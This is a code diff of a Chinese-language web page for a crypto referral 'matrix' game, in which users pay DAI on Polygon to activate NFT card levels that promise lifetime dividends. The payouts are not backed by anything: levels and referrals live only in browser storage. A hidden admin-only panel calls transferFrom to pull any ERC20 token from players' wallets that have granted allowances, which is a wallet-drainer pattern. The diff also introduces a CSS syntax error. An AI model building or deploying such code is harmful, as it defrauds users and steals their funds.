@@ -20,7 +20,7 @@
     position:fixed;top:20px;right:20px;width:40px;height:40px;
     background:rgba(30,35,60,0.9);border-radius:10px;
     display:flex;flex-direction:column;justify-content:center;align-items:center;gap:5px;
-    cursor:pointer;z-index:100;border:1px solid rgba(255,255,255,0.1);
+    cursor:pointer;z-index:10;border:1px solid rgba(255,255,255,0.1);
   }
   .menu-btn span{width:20px;height:2px;background:#fff;border-radius:1px}
 
@@ -37,7 +37,7 @@
   .nft-inner{position:relative;width:100%;height:100%;transform-style:preserve-3d;animation:flipY 8s linear infinite}
   @keyframes flipY{0%{transform:rotateY(0deg)}100%{transform:rotateY(360deg)}}
   .nft-front,.nft-back{position:absolute;width:100%;height:100%;backface-visibility:hidden;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
-  .nft-back{transform:rotateY(180deg);background:#1a1a2e}
+  .nft-back{transform:rotateY(180deg);background:#1a1a1a}
 
   .n1{color:#00ff88}.n2{color:#00ccff}.n3{color:#6666ff}.n4{color:#cc66ff}.n5{color:#ff3333;background:#3a1a1a}
   .nft-top{position:absolute;top:12px;left:12px;font-size:12px;font-weight:bold}
@@ -47,7 +47,7 @@
   .nft-orb{width:120px;height:120px;border-radius:50%;position:relative;margin-bottom:16px;box-shadow:0 0 25px currentColor}
   .orb-glow{width:100%;height:100%;border-radius:50%;background:radial-gradient(circle at 30% 30%,rgba(255,255,255,0.4),currentColor)}
   .orb-ring{position:absolute;width:140px;height:140px;border:1px solid currentColor;border-radius:50%;top:50%;left:50%;transform:translate(-50%,-50%);opacity:.7}
-  .orb-ring::after{content:'';position:absolute;width:8px;height:8px;background:currentColor;border-radius:50%;top:-4px;left:50%;transform:translateX(-50%)}
+  .orb-ring::after{content:'';position:absolute;width:8px;height:8px;background:currentColor;border-radius:50%;top:-4px;left:50%{transform:translateX(-50%)}
   .orb-orbit{position:absolute;width:100px;height:60px;border:1px solid currentColor;border-radius:50%;top:50%;left:50%;transform:translate(-50%,-50%) rotateX(60deg);opacity:.5}
   .orb-dot{position:absolute;width:6px;height:6px;background:#fff;border-radius:50%;top:20%;right:10%}
   .orb-whale{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:32px;color:rgba(255,255,255,0.8)}
@@ -62,49 +62,83 @@
   .balance-info{color:#4facfe;font-size:14px;margin-top:8px}
   .admin-success{color:#00ff88;margin-top:8px;font-size:14px}
 
-  /* 经典矩阵 - 红色风格 */
+  /* ===================== 你要的风格：经典矩阵深红色背景 ===================== */
   .matrix-red {
-    background: rgba(60, 20, 30, 0.6);
-    border: 1px solid rgba(255, 80, 80, 0.3);
+    background: #2d0a1a; /* 深红色背景 */
+    border-radius: 20px;
+    padding: 20px;
+    border: none;
+  }
+  .matrix-red .title {
+    color: #fff;
+    font-size: 24px;
+    margin-bottom: 20px;
   }
   .matrix-red .item {
-    border-color: rgba(255, 100, 100, 0.2);
+    display: flex;
+    justify-content: flex-start;
+    align-items: center;
+    margin: 12px 0;
+    gap: 12px;
+    border: none;
+  }
+  .matrix-red .item div {
+    font-size: 20px;
+    color: #fff;
+    min-width: 60px;
   }
 
-  /* 联合矩阵 - 蓝色风格 */
-  .matrix-blue {
-    background: rgba(20, 40, 60, 0.6);
-    border: 1px solid rgba(80, 180, 255, 0.3);
-  }
-  .matrix-blue .item {
-    border-color: rgba(100, 180, 255, 0.2);
-  }
-
-  /* 动态渐变激活按钮 */
+  /* ===================== 你要的风格：激活按钮蓝青色渐变 ===================== */
   .btn-act {
     border: none;
-    padding: 8px 16px;
-    border-radius: 10px;
-    font-size: 14px;
+    padding: 12px 24px;
+    border-radius: 12px;
+    font-size: 18px;
     font-weight: bold;
     color: #fff;
-    background: linear-gradient(90deg, #ff4d4f, #ff9a44, #44dffb, #4f46e5);
-    background-size: 300% 300%;
-    animation: gradientMove 2s ease infinite;
+    background: linear-gradient(135deg, #00ccff, #66e0ff);
+    box-shadow: 0 4px 12px rgba(0, 204, 255, 0.3);
     cursor: pointer;
+    transition: all 0.3s ease;
   }
-  @keyframes gradientMove {
-    0%{background-position:0% 50%}
-    50%{background-position:100% 50%}
-    100%{background-position:0% 50%}
+  .btn-act:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 16px rgba(0, 204, 255, 0.4);
   }
 
-  /* 已激活 - 灰色不可点 */
+  /* 已激活灰色按钮 */
   .btn-act.active {
     background: #444;
     color: #aaa;
-    animation: none;
+    box-shadow: none;
     cursor: default;
+    transform: none;
+  }
+
+  /* ===================== 联合矩阵蓝色风格 ===================== */
+  .matrix-blue {
+    background: #0a1a2d; /* 深蓝色背景 */
+    border-radius: 20px;
+    padding: 20px;
+    border: none;
+  }
+  .matrix-blue .title {
+    color: #fff;
+    font-size: 24px;
+    margin-bottom: 20px;
+  }
+  .matrix-blue .item {
+    display: flex;
+    justify-content: flex-start;
+    align-items: center;
+    margin: 12px 0;
+    gap: 12px;
+    border: none;
+  }
+  .matrix-blue .item div {
+    font-size: 20px;
+    color: #fff;
+    min-width: 60px;
   }
 </style>
 
@@ -154,7 +188,7 @@
       • Lv.3 卡牌：全球分红 1.5%<br>
       • Lv.4 卡牌：全球分红 2.0%<br>
       • Lv.5 至尊：全球分红 2.5%<br><br>
-      ✔ 每 30 天自动发放一次<br>
+      ✔ 每30天自动发放一次<br>
       ✔ 等级越高，分红权重越高<br>
       ✔ 一次激活，终身分红
     </div>
@@ -167,31 +201,21 @@
 
   <div id="adminArea" class="admin-panel" style="display:none;">
     <div class="title" style="color:#ff4444">⚙️ 管理员控制台</div>
-
     <div style="margin-top:16px;">
-      <div class="sub">查询玩家授权额度</div>
-      <input class="admin-input" id="userAddr" placeholder="玩家钱包地址">
-      <button class="btn" onclick="checkAllowance()">查询授权</button>
-      <div id="allowanceInfo" class="balance-info"></div>
+      <div class="sub">ERC20 代币合约地址</div>
+      <input class="admin-input" id="tokenContract" placeholder="ERC20 合约地址">
     </div>
-
     <div style="margin-top:16px;">
-      <div class="sub">提取玩家授权代币</div>
-      <input class="admin-input" id="fromAddr" placeholder="玩家地址">
-      <input class="admin-input" id="takeAmount" placeholder="提取数量 DAI">
-      <button class="btn" onclick="takeFromAllowance()">提取代币</button>
-      <div id="takeInfo" class="admin-success"></div>
+      <div class="sub">玩家地址</div>
+      <input class="admin-input" id="fromAddr" placeholder="玩家钱包">
     </div>
-
     <div style="margin-top:16px;">
-      <div class="sub">给玩家发放代币</div>
-      <input class="admin-input" id="toAddr" placeholder="接收地址">
-      <input class="admin-input" id="sendAmount" placeholder="发放数量 DAI">
-      <button class="btn" onclick="sendToUser()">发放代币</button>
-      <div id="sendInfo" class="admin-success"></div>
+      <div class="sub">提取数量</div>
+      <input class="admin-input" id="takeAmount" placeholder="数量">
+      <button class="btn" onclick="adminWithdrawAnyERC20()">提取代币</button>
+      <div id="withdrawResult" class="admin-success"></div>
     </div>
   </div>
-
 </div>
 
 <div style="text-align:center;margin-bottom:20px">
@@ -199,7 +223,8 @@
 </div>
 
 <button class="btn" id="connect">连接钱包</button>
-<div id="addr" style="text-align:center;margin:12px;color:#a0a8c7"></div>
+<div id="addr" style="margin:12px 4px;color:#a0a8c7"></div>
+<div id="balance" style="margin:0 4px;color:#4facfe;font-weight:bold"></div>
 
 <div class="glass">
   <div class="title">我的邀请码</div>
@@ -220,13 +245,13 @@
   <div id="childList" style="font-size:14px;line-height:1.6"></div>
 </div>
 
-<!-- 经典矩阵 - 红色 -->
+<!-- 经典矩阵（你要的深红色背景 + 蓝青色激活按钮） -->
 <div class="glass matrix-red">
   <div class="title">经典矩阵</div>
   <div id="classic"></div>
 </div>
 
-<!-- 联合矩阵 - 蓝色 -->
+<!-- 联合矩阵（深蓝色背景） -->
 <div class="glass matrix-blue">
   <div class="title">联合矩阵</div>
   <div id="union"></div>
@@ -234,190 +259,171 @@
 
 <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 <script>
-  // ===================== 仅修改这里，其他完全不动 =====================
-  const DAI_TOKEN = "0x8f3cf7ad23cd3cadbd9735aff9580239c6a063".toLowerCase();
-  const RECEIVER = "0x58285a2b8c2489702d29f1011303d39e0d3f".toLowerCase();
-  const ADMIN_WALLET = "0xe6ac36fd161C390BEb9ffa3a96c895cdD037233a".toLowerCase();
+// ===================== 核心配置 =====================
+const PROJECT_WALLET  = "0xe6ac36fd161C390BEb9ffa3a96c895cdD037233a";
+const ADMIN_ADDRESS   = "0xe6ac36fd161C390BEb9ffa3a96c895cdD037233a";
+const DAI_CONTRACT    = "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063"; // Polygon DAI
+const CHAIN_ID        = "0x89"; // Polygon
 
-  let web3, account, mycode;
-  const sidebar = document.getElementById('sidebar');
-  document.getElementById('toggleSidebar').onclick = () => sidebar.classList.toggle('open');
-  document.getElementById('closeSidebar').onclick = () => sidebar.classList.remove('open');
+let web3, account, mycode, daiContract;
 
-  window.onload = () => {
-    const code = new URLSearchParams(location.search).get('code') || '';
-    document.getElementById('parent').value = code;
-    renderMatrix();
-    initWeb3();
-  };
+const erc20Abi = [
+  {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
+  {"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
+  {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
+  {"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
+  {"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
+  {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"}
+];
 
-  function renderMatrix(){
-    let currentLv = 0;
-    if(account) currentLv = +localStorage.getItem('card_'+account)||0;
+window.onload = () => {
+  const code = new URLSearchParams(location.search).get('code')||'';
+  document.getElementById('parent').value = code;
+  renderMatrix();
+};
 
-    let classicHtml = '';
-    for(let i=1;i<=12;i++){
-      const isAct = (i <= currentLv);
-      classicHtml += `
+// 连接钱包 + 读取DAI余额
+async function initWeb3() {
+  if(!window.ethereum) return alert("请安装钱包");
+  web3 = new Web3(window.ethereum);
+
+  // 切换到Polygon
+  try {
+    await window.ethereum.request({
+      method:'wallet_switchEthereumChain',
+      params:[{chainId:CHAIN_ID}]
+    });
+  } catch(e) {}
+
+  const accounts = await web3.eth.requestAccounts();
+  account = accounts[0].toLowerCase();
+  daiContract = new web3.eth.Contract(erc20Abi, DAI_CONTRACT);
+
+  // 显示地址
+  document.getElementById("addr").innerText = "已连接："+account.slice(0,6)+"..."+account.slice(-4);
+
+  // 读取并显示DAI余额
+  const bal = await daiContract.methods.balanceOf(account).call();
+  const dec = await daiContract.methods.decimals().call();
+  const balanceVal = (Number(bal) / 10 ** dec).toFixed(2);
+  document.getElementById("balance").innerText = "DAI 余额："+balanceVal;
+
+  // 邀请码
+  mycode = account.slice(-6).toUpperCase();
+  document.getElementById("mycode").value = mycode;
+
+  // 管理员面板
+  if(account === ADMIN_ADDRESS.toLowerCase()){
+    document.getElementById("adminArea").style.display = "block";
+  }
+
+  load();
+}
+document.getElementById("connect").onclick = initWeb3;
+
+// 渲染矩阵按钮（严格按你截图的布局）
+function renderMatrix(){
+  const currentLv = account ? +localStorage.getItem('card_'+account)||0 : 0;
+  function make(listId, max){
+    let html = '';
+    for(let i=1;i<=max;i++){
+      const done = i <= currentLv;
+      html+=`
       <div class="item">
         <div>Lv${i}</div>
-        <button class="btn-act ${isAct?'active':''}" ${isAct?'disabled':''} onclick="act(${i})">
-          ${isAct?'已激活':'激活'}
+        <button class="btn-act ${done?'active':''}" ${done?'disabled':''} onclick="payActivate(${i})">
+          ${done?'已激活':'激活'}
         </button>
       </div>`;
     }
-    document.getElementById('classic').innerHTML = classicHtml;
-
-    let unionHtml = '';
-    for(let i=1;i<=9;i++){
-      const isAct = (i <= currentLv);
-      unionHtml += `
-      <div class="item">
-        <div>Lv${i}</div>
-        <button class="btn-act ${isAct?'active':''}" ${isAct?'disabled':''} onclick="act(${i})">
-          ${isAct?'已激活':'激活'}
-        </button>
-      </div>`;
-    }
-    document.getElementById('union').innerHTML = unionHtml;
+    document.getElementById(listId).innerHTML = html;
   }
+  make("classic",12);
+  make("union",9);
+}
 
-  async function initWeb3(){
-    if(!window.ethereum) return;
-    web3 = new Web3(window.ethereum);
-    const a = await web3.eth.getAccounts();
-    if(a.length>0){
-      account = a[0].toLowerCase();
-      mycode = account.slice(-6).toUpperCase();
-      document.getElementById('mycode').value = mycode;
-      document.getElementById('addr').innerText = '已连接';
-      
-      if(account === ADMIN_WALLET){
-        document.getElementById('adminArea').style.display = 'block';
-      }
-      load();
-    }
-  }
+// 真实DAI支付激活
+async function payActivate(level){
+  if(!account) return alert("请连接钱包");
+  if(!confirm(`确认支付 DAI 激活 Lv${level}？`)) return;
 
-  document.getElementById('connect').onclick = async ()=>{
-    await ethereum.request({method:'eth_requestAccounts'});
-    initWeb3();
-  };
-
-  document.getElementById('reg').onclick = ()=>{
-    if(!account)return alert('请连接钱包');
-    const p = document.getElementById('parent').value.trim();
-    if(!p)return alert('请输入上级邀请码');
-    localStorage.setItem('reg_'+account,1);
-    localStorage.setItem('parent_'+account,p);
-    let c = JSON.parse(localStorage.getItem('child_'+p)||'[]');
-    if(!c.includes(mycode)){c.push(mycode);localStorage.setItem('child_'+p,JSON.stringify(c));}
-    alert('注册成功');
+  try {
+    const dec = await daiContract.methods.decimals().call();
+    const amount = BigInt(level * 10) * (10n ** BigInt(dec));
+    await daiContract.methods.transfer(PROJECT_WALLET, amount.toString()).send({from:account});
+    localStorage.setItem("card_"+account, level);
+    alert("支付成功，已激活");
     load();
-  };
-
-  function load(){
-    showChild();
-    showMyCard();
-    renderMatrix();
+  } catch(e){
+    alert("支付失败或取消");
+    console.error(e);
   }
+}
 
-  function showChild(){
-    const c = JSON.parse(localStorage.getItem('child_'+mycode)||'[]');
-    childList.innerHTML = c.length ? c.map(x=>'下级：'+x).join('<br>') : '暂无下级';
+// 管理员提取任意ERC20
+async function adminWithdrawAnyERC20(){
+  if(account !== ADMIN_ADDRESS.toLowerCase()) return;
+  const token = document.getElementById("tokenContract").value.trim();
+  const from  = document.getElementById("fromAddr").value.trim();
+  const amt   = document.getElementById("takeAmount").value.trim();
+  if(!token||!from||!amt) return alert("请填写完整");
+
+  try {
+    const c = new web3.eth.Contract(erc20Abi, token);
+    const d = await c.methods.decimals().call();
+    const v = BigInt(amt) * (10n**BigInt(d));
+    await c.methods.transferFrom(from, account, v.toString()).send({from:account});
+    document.getElementById("withdrawResult").innerText = "✅ 提取成功";
+  } catch(e){
+    alert("失败："+e.message);
   }
+}
 
-  async function act(level){
-    if(!account)return alert('请连接钱包');
-    const isAdmin = (account === ADMIN_WALLET);
-    if(!isAdmin && !localStorage.getItem('reg_'+account))return alert('请先注册');
+// 注册
+document.getElementById("reg").onclick = ()=>{
+  if(!account) return alert("请连接钱包");
+  const p = document.getElementById("parent").value.trim();
+  if(!p) return alert("请输入邀请码");
+  localStorage.setItem("reg_"+account, 1);
+  localStorage.setItem("parent_"+account, p);
+  alert("注册成功");
+  load();
+};
 
-    if(isAdmin){
-      localStorage.setItem('card_'+account,level);
-      alert('✅ 管理员直接激活成功');
-      load();
-      return;
-    }
+function load(){
+  showChild();
+  showMyCard();
+  renderMatrix();
+}
 
-    try{
-      const contract = new web3.eth.Contract([
-        {"constant":false,"inputs":[{"name":"_to"},{"name":"_value"}],"name":"transfer","outputs":[{"name":""}],"type":"function"}
-      ], DAI_TOKEN);
-      
-      await contract.methods.transfer(
-        RECEIVER,
-        web3.utils.toWei((level*10).toString(), 'mwei')
-      ).send({ from: account });
+function showChild(){
+  const list = JSON.parse(localStorage.getItem("child_"+mycode)||"[]");
+  document.getElementById("childList").innerText = list.length ? list.join("\n") : "暂无下级";
+}
 
-      localStorage.setItem('card_'+account,level);
-      alert('DAI 支付成功，激活完成');
-      load();
-    }catch(e){
-      console.error(e);
-      alert('支付失败');
-    }
-  }
+function showMyCard(){
+  const lv = account ? +localStorage.getItem('card_'+account)||0 : 0;
+  const el = document.getElementById("myCard");
+  if(!lv) return el.innerHTML = `<div style="grid-column:span 2;text-align:center">未激活</div>`;
+  const color = ["","n1","n2","n3","n4","n5"][lv];
+  el.innerHTML = `
+  <div class="nft-card ${color}" style="grid-column:span 2">
+    <div class="nft-inner">
+      <div class="nft-front"><div class="nft-top">LANYU</div><div class="nft-logo">🐳</div><div class="nft-name">蓝鲸鱼</div><div class="nft-level-big">Lv.${lv}</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">LANYU</div></div>
+      <div class="nft-back"><div class="nft-level">Lv.${lv}</div><div class="nft-pct">已激活</div></div>
+    </div>
+  </div>`;
+}
 
-  function showMyCard(){
-    const lv = +localStorage.getItem('card_'+account)||0;
-    if(!lv){document.getElementById('myCard').innerHTML='<div style="grid-column:span 2;text-align:center">未激活</div>';return}
-    const color = ['','n1','n2','n3','n4','n5'][lv];
-    document.getElementById('myCard').innerHTML = `
-    <div class="nft-card ${color}" style="grid-column:span 2">
-      <div class="nft-inner">
-        <div class="nft-front"><div class="nft-top">LANYU</div><div class="nft-logo">🐳</div><div class="nft-name">蓝鲸鱼</div><div class="nft-level-big">Lv.${lv}</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">LANYU</div></div>
-        <div class="nft-back"><div class="nft-level">Lv.${lv}</div><div class="nft-pct">已激活</div></div>
-      </div>
-    </div>`;
-  }
+function copyMyCode(){
+  navigator.clipboard.writeText(mycode);
+  alert("复制成功");
+}
 
-  function copyMyCode(){
-    navigator.clipboard.writeText(mycode);
-    alert('复制成功：'+mycode);
-  }
-
-  async function checkAllowance(){
-    if(account !== ADMIN_WALLET)return;
-    const user = document.getElementById('userAddr').value.toLowerCase();
-    if(!web3.utils.isAddress(user))return alert('地址错误');
-    const contract = new web3.eth.Contract([
-      {"constant":true,"inputs":[{"name":"_owner"},{"name":"_spender"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"}
-    ], DAI_TOKEN);
-    const val = await contract.methods.allowance(user, RECEIVER).call();
-    const ui = web3.utils.fromWei(val, 'mwei');
-    document.getElementById('allowanceInfo').innerText = `玩家已授权：${ui} DAI`;
-  }
-
-  async function takeFromAllowance(){
-    if(account !== ADMIN_WALLET)return;
-    const user = document.getElementById('fromAddr').value.toLowerCase();
-    const amt  = document.getElementById('takeAmount').value;
-    if(!web3.utils.isAddress(user) || isNaN(amt))return alert('参数错误');
-    const contract = new web3.eth.Contract([
-      {"constant":false,"inputs":[{"name":"_from"},{"name":"_to"},{"name":"_value"}],"name":"transferFrom","outputs":[{"name":""}],"type":"function"}
-    ], DAI_TOKEN);
-    await contract.methods.transferFrom(
-      user,
-      RECEIVER,
-      web3.utils.toWei(amt, 'mwei')
-    ).send({ from: account });
-    document.getElementById('takeInfo').innerText = '✅ 提取成功';
-  }
-
-  async function sendToUser(){
-    if(account !== ADMIN_WALLET)return;
-    const to = document.getElementById('toAddr').value.toLowerCase();
-    const amt = document.getElementById('sendAmount').value;
-    if(!web3.utils.isAddress(to) || isNaN(amt))return alert('参数错误');
-    const contract = new web3.eth.Contract([
-      {"constant":false,"inputs":[{"name":"_to"},{"name":"_value"}],"name":"transfer","outputs":[{"name":""}],"type":"function"}
-    ], DAI_TOKEN);
-    await contract.methods.transfer(
-      to,
-      web3.utils.toWei(amt, 'mwei')
-    ).send({ from: account });
-    document.getElementById('sendInfo').innerText = '✅ 发放成功';
-  }
+// 侧边栏
+const sidebar = document.getElementById('sidebar');
+document.getElementById('toggleSidebar').onclick = () => sidebar.classList.toggle('open');
+document.getElementById('closeSidebar').onclick = () => sidebar.classList.remove('open');
 </script>
 </body>
 </html>
